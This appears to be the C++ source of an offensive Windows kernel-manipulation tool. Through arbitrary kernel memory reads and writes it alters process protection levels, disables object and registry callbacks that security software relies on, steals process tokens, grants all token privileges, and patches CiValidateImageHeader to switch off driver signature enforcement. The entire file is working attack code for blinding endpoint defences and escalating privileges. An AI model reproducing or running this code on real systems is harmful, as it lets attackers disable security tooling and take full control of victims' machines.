#include "utils.h"
#include "kernel.h"
#include "log.h"

ULONG64 g_OffCallbackList      = 0xC8;
ULONG64 g_CmCallbackList       = 0;
ULONG64 g_OffToken             = 0x248;

bool SetPPL(DWORD pid, int protection) {
    ULONG64 process = GetProcessByPid(pid);
    if (!process) {
        LOG_ERR("SetPPL: PID %lu not found.", pid);
        return false;
    }

    ULONG64 protectionVA = process + g_OffProtection;
    BYTE cur = 0;
    if (!KVMRead(protectionVA, &cur, 1)) {
        LOG_ERR("SetPPL: failed to read current protection.");
        return false;
    }
    LOG_INFO("SetPPL: PID %lu current Protection = 0x%02X", pid, cur);

    if ((DWORD)protection == (DWORD)-1) {
        LOG_INFO("SetPPL: -1 skip, value unchanged.");
        return true;
    }

    BYTE newVal = (BYTE)protection;
    if (!KVMWrite(protectionVA, &newVal, 1)) {
        LOG_ERR("SetPPL: failed to write.");
        return false;
    }

    LOG_OK("SetPPL: PID %lu Protection = 0x%02X", pid, newVal);
    return true;
}

bool DisableObTypeCallbacks(const wchar_t* typeName) {
    ULONG64 typeVarVA = GetSystemRoutineAddress(typeName);
    if (!typeVarVA) {
        LOG_ERR("DisableObTypeCallbacks: %S not found.", typeName);
        return false;
    }
    LOG_INFO("DisableObTypeCallbacks: %S @ 0x%llX", typeName, typeVarVA);

    ULONG64 objectTypeVA = 0;
    if (!KVMRead(typeVarVA, &objectTypeVA, sizeof(objectTypeVA))) {
        LOG_ERR("DisableObTypeCallbacks: deref %S @ 0x%llX failed.", typeName, typeVarVA);
        return false;
    }
    LOG_INFO("DisableObTypeCallbacks: *0x%llX = 0x%llX (OBJECT_TYPE)", typeVarVA, objectTypeVA);
    if (!objectTypeVA) {
        LOG_ERR("DisableObTypeCallbacks: %S OBJECT_TYPE pointer is NULL.", typeName);
        return false;
    }

    ULONG64 listHeadVA = objectTypeVA + g_OffCallbackList;
    LOG_INFO("DisableObTypeCallbacks: OBJECT_TYPE=0x%llX +OffCallbackList=0x%llX -> listHeadVA=0x%llX",
             objectTypeVA, g_OffCallbackList, listHeadVA);

    LIST_ENTRY listHead = {};
    if (!KVMRead(listHeadVA, &listHead, sizeof(listHead))) {
        LOG_ERR("DisableObTypeCallbacks: read CallbackList head @ 0x%llX failed.", listHeadVA);
        LOG_ERR("    Try adjusting g_OffCallbackList (current=0x%llX).", g_OffCallbackList);
        return false;
    }

    LOG_INFO("DisableObTypeCallbacks: listHead Flink=0x%llX  Blink=0x%llX",
             (ULONG64)listHead.Flink, (ULONG64)listHead.Blink);

    ULONG64 current = (ULONG64)listHead.Flink;
    int count = 0;
    while (current != listHeadVA && current != 0) {
        LOG_INFO("DisableObTypeCallbacks: entry %d @ 0x%llX", count, current);
        ULONG32 zero = 0;
        KVMWrite(current + 0x10, &zero, sizeof(zero));
        KVMWrite(current + 0x14, &zero, sizeof(zero));
        count++;

        LIST_ENTRY entry = {};
        if (!KVMRead(current, &entry, sizeof(entry))) break;
        current = (ULONG64)entry.Flink;
    }

    if (count > 0)
        LOG_OK("DisableObTypeCallbacks: %S neutralized %d entries.", typeName, count);
    else
        LOG_INFO("DisableObTypeCallbacks: %S has no callbacks registered.", typeName);

    return true;
}



static bool DisableCmCallback(ULONG64 listHeadVA) {
    if (!listHeadVA) {
        LOG_ERR("DisableCmCallback: listHeadVA is NULL.");
        return false;
    }

    LOG_INFO("DisableCmCallback: reading list head @ 0x%llX", listHeadVA);

    LIST_ENTRY listHead = {};
    if (!KVMRead(listHeadVA, &listHead, sizeof(listHead))) {
        LOG_ERR("DisableCmCallback: read head 0x%llX failed.", listHeadVA);
        return false;
    }

    LOG_INFO("DisableCmCallback: Flink=0x%llX  Blink=0x%llX",
             (ULONG64)listHead.Flink, (ULONG64)listHead.Blink);

    if ((ULONG64)listHead.Flink == listHeadVA) {
        LOG_OK("DisableCmCallback: list already empty (Flink==self).");
        return true;
    }

    ULONG64 current = (ULONG64)listHead.Flink;
    int count = 0, limit = 10000;

    while (current != listHeadVA && current != 0 && --limit > 0) {
        LOG_INFO("DisableCmCallback: entry %d @ 0x%llX", count, current);
        ULONG64 next = 0;
        if (!KVMRead(current, &next, sizeof(next))) {
            LOG_ERR("DisableCmCallback: read Flink @ 0x%llX failed.", current);
            break;
        }
        count++;
        current = next;
    }

    LOG_INFO("DisableCmCallback: walked %d entries, about to isolate head.", count);

    ULONG64 self = listHeadVA;
    if (!KVMWrite(listHeadVA, &self, sizeof(self))) {
        LOG_ERR("DisableCmCallback: write Flink @ 0x%llX failed.", listHeadVA);
        return false;
    }
    if (!KVMWrite(listHeadVA + sizeof(ULONG64), &self, sizeof(self))) {
        LOG_ERR("DisableCmCallback: write Blink @ 0x%llX failed.",
                listHeadVA + sizeof(ULONG64));
        return false;
    }

    LIST_ENTRY verify = {};
    if (!KVMRead(listHeadVA, &verify, sizeof(verify))) {
        LOG_ERR("DisableCmCallback: verify read failed.");
        return false;
    }
    if ((ULONG64)verify.Flink != listHeadVA || (ULONG64)verify.Blink != listHeadVA) {
        LOG_ERR("DisableCmCallback: verify mismatch Flink=0x%llX Blink=0x%llX (expected 0x%llX).",
                (ULONG64)verify.Flink, (ULONG64)verify.Blink, listHeadVA);
        return false;
    }

    LOG_OK("DisableCmCallback: head 0x%llX isolated, %d entries detached.",
           listHeadVA, count);
    return true;
}

static bool CheckCmCallbackHead(ULONG64 addr) {
    if (!addr) return false;
    LIST_ENTRY e = {};
    if (!KVMRead(addr, &e, sizeof(e))) return false;
    ULONG64 f = (ULONG64)e.Flink;
    ULONG64 b = (ULONG64)e.Blink;
    if (!f || !b) return false;
    return (f >> 48) == 0xFFFF && (b >> 48) == 0xFFFF;
}

ULONG64 FindCmCallbackListHead() {
    ULONG64 fnVA = GetSystemRoutineAddress(L"CmUnRegisterCallback");
    if (!fnVA) {
        LOG_ERR("FindCmCallbackListHead: CmUnRegisterCallback not found.");
        return 0;
    }
    LOG_INFO("FindCmCallbackListHead: CmUnRegisterCallback @ 0x%llX", fnVA);

    BYTE buf[0x1000];
    for (int i = 0; i < 0x1000; i += 0x100) {
        if (!KVMRead(fnVA + i, buf + i, 0x100)) {
            LOG_ERR("FindCmCallbackListHead: read code @ +0x%X failed.", i);
            return 0;
        }
    }

    for (ULONG off = 0; off < 0x1000 - 6; off++) {
        bool isRipLea = false;
        if (buf[off] == 0x48 && buf[off + 1] == 0x8D && buf[off + 2] == 0x0D)
            isRipLea = true;
        else if (buf[off] == 0x4C && buf[off + 1] == 0x8D && buf[off + 2] == 0x0D)
            isRipLea = true;
        else if (buf[off] == 0x4D && buf[off + 1] == 0x8D && buf[off + 2] == 0x1D)
            isRipLea = true;

        if (!isRipLea) continue;

        INT32  disp   = *(INT32*)(buf + off + 3);
        ULONG64 target = fnVA + off + disp + 7;

        LOG_INFO("FindCmCallbackListHead: LEA @ +0x%lX -> target=0x%llX", off, target);

        if (CheckCmCallbackHead(target)) {
            LOG_OK("FindCmCallbackListHead: direct hit @ 0x%llX", target);
            return target;
        }

        ULONG64 indirect = 0;
        if (KVMRead(target, &indirect, sizeof(indirect)) && CheckCmCallbackHead(indirect)) {
            LOG_OK("FindCmCallbackListHead: indirect hit 0x%llX -> 0x%llX",
                   target, indirect);
            return indirect;
        }
    }

    LOG_ERR("FindCmCallbackListHead: not found.");
    return 0;
}

bool RemoveCmCallback() {
    LOG_INFO("RemoveCmCallback: g_CmCallbackList=0x%llX", g_CmCallbackList);

    if (DisableCmCallback(g_CmCallbackList))
        return true;

    if (g_CmCallbackList != 0) {
        ULONG64 derefHead = 0;
        if (KVMRead(g_CmCallbackList, &derefHead, sizeof(derefHead))) {
            LOG_INFO("RemoveCmCallback: *0x%llX = 0x%llX", g_CmCallbackList, derefHead);
            if (derefHead != 0 && derefHead != g_CmCallbackList) {
                LOG_INFO("RemoveCmCallback: retry with dereferenced head 0x%llX.", derefHead);
                if (DisableCmCallback(derefHead))
                    return true;
            }
        } else {
            LOG_ERR("RemoveCmCallback: read deref @ 0x%llX failed.", g_CmCallbackList);
        }
    }

    LOG_ERR("RemoveCmCallback: failed.");
    return false;
}

ULONG64 GetProcessToken(ULONG64 eprocess) {
    if (!eprocess) return 0;
    ULONG64 token = 0;
    if (!KVMRead(eprocess + g_OffToken, &token, sizeof(token))) {
        LOG_ERR("GetProcessToken: read token @ 0x%llX+0x%llX failed", eprocess, g_OffToken);
        return 0;
    }
    return token;
}

bool SetProcessToken(ULONG64 eprocess, ULONG64 token) {
    if (!eprocess || !token) return false;
    if (!KVMWrite(eprocess + g_OffToken, &token, sizeof(token))) {
        LOG_ERR("SetProcessToken: write token @ 0x%llX+0x%llX failed", eprocess, g_OffToken);
        return false;
    }
    return true;
}

bool StealToken(DWORD srcPid, DWORD dstPid) {
    ULONG64 srcProc = GetProcessByPid(srcPid);
    if (!srcProc) {
        LOG_ERR("StealToken: source PID %lu not found", srcPid);
        return false;
    }

    ULONG64 dstProc = GetProcessByPid(dstPid);
    if (!dstProc) {
        LOG_ERR("StealToken: target PID %lu not found", dstPid);
        return false;
    }

    ULONG64 srcToken = GetProcessToken(srcProc);
    if (!srcToken) {
        LOG_ERR("StealToken: source PID %lu has no token", srcPid);
        return false;
    }

    ULONG64 tokenPtr = srcToken & ~0xFULL;
    LOG_INFO("StealToken: srcPID=%lu EPROCESS=0x%llX Token=0x%llX (ptr=0x%llX)",
             srcPid, srcProc, srcToken, tokenPtr);
    LOG_INFO("StealToken: dstPID=%lu EPROCESS=0x%llX", dstPid, dstProc);

    if (!SetProcessToken(dstProc, srcToken)) {
        LOG_ERR("StealToken: write to target failed");
        return false;
    }

    LOG_OK("StealToken: PID %lu -> PID %lu  token=0x%llX", srcPid, dstPid, srcToken);
    return true;
}

bool SetTokenPrivileges(DWORD pid, ULONG64 privMask) {
    ULONG64 eprocess = GetProcessByPid(pid);
    if (!eprocess) {
        LOG_ERR("SetTokenPrivileges: PID %lu not found", pid);
        return false;
    }

    ULONG64 fastRef = GetProcessToken(eprocess);
    if (!fastRef) {
        LOG_ERR("SetTokenPrivileges: PID %lu has no token", pid);
        return false;
    }

    ULONG64 tokenPtr = fastRef & ~0xFULL;
    LOG_INFO("SetTokenPrivileges: PID=%lu EPROCESS=0x%llX Token=0x%llX (ptr=0x%llX)",
             pid, eprocess, fastRef, tokenPtr);

    ULONG64 privVa = tokenPtr + 0x40;
    ULONG64 curPresent = 0;
    if (!KVMRead(privVa, &curPresent, sizeof(curPresent))) {
        LOG_ERR("SetTokenPrivileges: read Present @ 0x%llX failed", privVa);
        return false;
    }
    LOG_INFO("SetTokenPrivileges: PID=%lu current privileges=0x%016llX", pid, curPresent);

    if (privMask == (ULONG64)-1) {
        LOG_INFO("SetTokenPrivileges: -1 skip, value unchanged.");
        return true;
    }

    if (!KVMWrite(privVa, &privMask, sizeof(privMask))) {
        LOG_ERR("SetTokenPrivileges: write Present @ 0x%llX failed", privVa);
        return false;
    }
    if (!KVMWrite(privVa + 0x08, &privMask, sizeof(privMask))) {
        LOG_ERR("SetTokenPrivileges: write Enabled @ 0x%llX failed", privVa + 0x08);
        return false;
    }
    if (!KVMWrite(privVa + 0x10, &privMask, sizeof(privMask))) {
        LOG_ERR("SetTokenPrivileges: write EnabledByDefault @ 0x%llX failed", privVa + 0x10);
        return false;
    }

    LOG_OK("SetTokenPrivileges: PID=%lu privileges=0x%016llX", pid, privMask);
    return true;
}

static ULONG64 s_CiValImgVA  = 0;
static BYTE    s_CiValImgOrig[4];

bool DisableDriverSignature() {
    ULONG64 ciInit = GetImportedDllFunctionViaIDT(L"ci.dll", L"CiInitialize");
    if (!ciInit) {
        LOG_ERR("DisableDriverSignature: CiInitialize not found");
        return false;
    }
    LOG_OK("CiInitialize = 0x%llX", ciInit);

    BYTE buf[0x1000];
    ULONG64 cipInit = 0;
    for (ULONG64 scan = ciInit & ~0xFFFULL; scan < ciInit + 0x1000; scan += 0x1000) {
        if (!KVMRead(scan, buf, sizeof(buf))) continue;
        ULONG64 base = scan;
        for (int i = 0; i + 1 < (int)sizeof(buf); i++) {
            if (buf[i] == 0x5F && buf[i + 1] == 0xC3) {
                ULONG64 popAddr = base + i;
                if (popAddr < ciInit) continue;
                if (popAddr - 24 < base) continue;

                int callOff = i - 24;
                if (buf[callOff] != 0xE8) continue;

                INT32 disp = *(INT32*)(buf + callOff + 1);
                cipInit = popAddr - 24 + 5 + disp;
                LOG_OK("CipInitialize = 0x%llX", cipInit);
                goto foundCip;
            }
        }
    }
foundCip:
    if (!cipInit) {
        LOG_ERR("DisableDriverSignature: CipInitialize not found");
        return false;
    }

    ULONG64 ciValImg = 0;
    for (ULONG64 scan = cipInit & ~0xFFFULL; scan < cipInit + 0x4000; scan += 0x1000) {
        if (!KVMRead(scan, buf, sizeof(buf))) continue;
        ULONG64 base = scan;
        for (size_t i = 0; i + 10 < sizeof(buf); i++) {
            if (buf[i] == 0x48 && buf[i + 1] == 0x8D && buf[i + 2] == 0x05) {
                if (i + 10 >= sizeof(buf)) continue;
                if (buf[i + 7] != 0x48 || buf[i + 8] != 0x89 || buf[i + 9] != 0x43 || buf[i + 10] != 0x20)
                    continue;

                INT32 disp = *(INT32*)(buf + i + 3);
                ciValImg = base + i + disp + 7;
                LOG_OK("CiValidateImageHeader = 0x%llX", ciValImg);
                goto foundVal;
            }
        }
    }
foundVal:
    if (!ciValImg) {
        LOG_ERR("DisableDriverSignature: CiValidateImageHeader not found");
        return false;
    }

    s_CiValImgVA = ciValImg;
    if (!KVMRead(s_CiValImgVA, s_CiValImgOrig, sizeof(s_CiValImgOrig))) {
        LOG_ERR("DisableDriverSignature: failed to read CiValidateImageHeader prologue");
        return false;
    }
    LOG_INFO("CiValidateImageHeader orig bytes: %02X %02X %02X %02X",
             s_CiValImgOrig[0], s_CiValImgOrig[1], s_CiValImgOrig[2], s_CiValImgOrig[3]);

    BYTE patch[4] = { 0x48, 0x30, 0xC0, 0xC3 };
    if (!KVMWrite(s_CiValImgVA, patch, sizeof(patch))) {
        LOG_ERR("DisableDriverSignature: failed to patch CiValidateImageHeader");
        return false;
    }
    LOG_OK("Driver signature enforcement DISABLED");
    return true;
}

bool RestoreDriverSignature() {
    if (!s_CiValImgVA) return false;
    if (!KVMWrite(s_CiValImgVA, s_CiValImgOrig, sizeof(s_CiValImgOrig))) {
        LOG_ERR("RestoreDriverSignature: failed to restore");
        return false;
    }
    LOG_OK("Driver signature enforcement RESTORED");
    return true;
}
